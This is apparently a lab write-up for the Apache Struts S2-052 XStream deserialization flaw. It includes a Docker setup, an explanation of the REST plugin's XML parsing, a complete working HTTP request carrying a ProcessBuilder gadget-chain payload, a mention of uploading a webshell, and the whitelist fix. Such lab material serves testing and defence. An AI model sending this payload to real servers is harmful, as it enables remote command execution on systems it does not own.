# S2-052 Remote Code Execution Vulnerability

Impact version: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12

Vulnerability details:

 - http://struts.apache.org/docs/s2-052.html
 - https://yq.aliyun.com/articles/197926

## Test environment construction

```
Docker-compose up -d
```

## Vulnerability Description

Struts2-Rest-Plugin is a plugin that enables Struts2 to implement the Restful API. It determines the type of packet passed by the user based on the Content-Type or URI extension. It has the following mapping table:

Extension | Content-Type | Resolution Method
---- | ---- | ----
Xml | application/xml | xstream
Json | application/json | jsonlib or jackson (optional)
Xhtml | application/xhtml+xml | None
None | application/x-www-form-urlencoded | None
None | multipart/form-data | None

Jsonlib can't introduce arbitrary objects, and xstream can introduce any object by default (for versions prior to 1.5.x). The method is to specify the class name to be instantiated directly through the tag name of xml:

```
<classname></classname>
//or
<paramname class="classname"></paramname>
```

Therefore, we can introduce any class to cause remote command execution vulnerabilities by deserialization. We only need to find a geget that is applicable in the Struts2 library.

## Vulnerability recurrence

After launching the environment, visit `http://your-ip:8080/orders.xhtml` to see the showcase page. Since the rest-plugin will determine the parsing method based on the URI extension or Content-Type, we only need to modify the orders.xhtml to order.xml or modify the Content-Type header to application/xml to pass the XML data in the Body.

So, the last packet sent is:

```
POST /orders/3/edit HTTP/1.1
Host: your-ip:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/xml
Content-Length: 2415

<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>touch</string>
                        <string>/tmp/success</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
```

If the above packet is successfully executed, the file `/tmp/success` will be created in the docker container, and `docker-compose exec struts2 ls /tmp/` can be executed.

In addition, we can also download a jspx webshell:

![](01.png)

There are some simpler ways to use them, so I won't go into details here.

## Vulnerability Fix

In struts2.5.13, according to the mitigation measures (http://x-stream.github.io/security.html) given by xstream, the whitelist for deserialization is added:

```java
Protected void addDefaultPermissions(ActionInvocation invocation, XStream stream) {
    stream.addPermission(new ExplicitTypePermission(new Class[]{invocation.getAction().getClass()}));
    If (invocation.getAction() instanceof ModelDriven) {
        stream.addPermission(new ExplicitTypePermission(new Class[]{((ModelDriven) invocation.getAction()).getModel().getClass()}));
    }
    stream.addPermission(NullPermission.NULL);
    stream.addPermission(PrimitiveTypePermission.PRIMITIVES);
    stream.addPermission(ArrayTypePermission.ARRAYS);
    stream.addPermission(CollectionTypePermission.COLLECTIONS);
    stream.addPermission(new ExplicitTypePermission(new Class[]{Date.class}));
}
```

However, at this time, the business logic of the previous code may be affected. Therefore, there is no particularly good way to carefully upgrade, that is, to exclude the old code one by one and remove the classes that are not in the whitelist.